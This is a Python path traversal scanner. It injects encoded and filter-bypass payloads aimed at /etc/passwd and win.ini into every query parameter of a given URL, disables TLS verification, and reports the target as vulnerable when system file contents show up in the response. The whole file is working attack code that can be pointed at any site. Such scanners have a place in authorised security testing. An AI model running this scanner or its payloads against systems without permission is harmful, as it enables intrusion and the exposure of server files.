from urllib.parse import urlparse, parse_qs, urlencode
import requests


class DirectoryTraversalScanner:

    def __init__(self, requester):

        self.requester = requester

        self.payloads = [

            "../../../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",

            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",

            "....//....//....//etc/passwd",

            "/etc/passwd",
            "C:\\windows\\win.ini"
        ]

        self.linux_indicators = [
            "root:x:",
            "/bin/bash",
            "/usr/sbin"
        ]

        self.windows_indicators = [
            "[extensions]",
            "for 16-bit app support",
            "[fonts]"
        ]

    def scan_url(self, url):

        findings = []

        parsed = urlparse(url)

        query_params = parse_qs(parsed.query)

        if not query_params:
            return findings

        for param in query_params:

            for payload in self.payloads:

                vulnerable_url = self.build_payload_url(
                    url,
                    param,
                    payload
                )

                result = self.test_traversal(
                    vulnerable_url,
                    payload
                )

                if result:
                    findings.append(result)

        return findings

    def build_payload_url(self, url, target_param, payload):

        parsed = urlparse(url)

        query_params = parse_qs(parsed.query)

        # حقن الـ payload
        query_params[target_param] = payload

        encoded_query = urlencode(
            query_params,
            doseq=True
        )

        malicious_url = parsed._replace(
            query=encoded_query
        ).geturl()

        return malicious_url

    def test_traversal(self, url, payload):

        try:

            response = requests.get(
                url,
                timeout=10,
                verify=False
            )

            if response:

                content = response.text.lower()

                # Linux Detection
                for indicator in self.linux_indicators:

                    if indicator.lower() in content:

                        return {
                            "type": "Directory Traversal",
                            "target": url,
                            "payload": payload,
                            "os": "Linux",
                            "evidence": indicator,
                            "status_code": response.status_code
                        }

                # Windows Detection
                for indicator in self.windows_indicators:

                    if indicator.lower() in content:

                        return {
                            "type": "Directory Traversal",
                            "target": url,
                            "payload": payload,
                            "os": "Windows",
                            "evidence": indicator,
                            "status_code": response.status_code
                        }

        except Exception as e:

            print(f"[ERROR] {e}")

        return None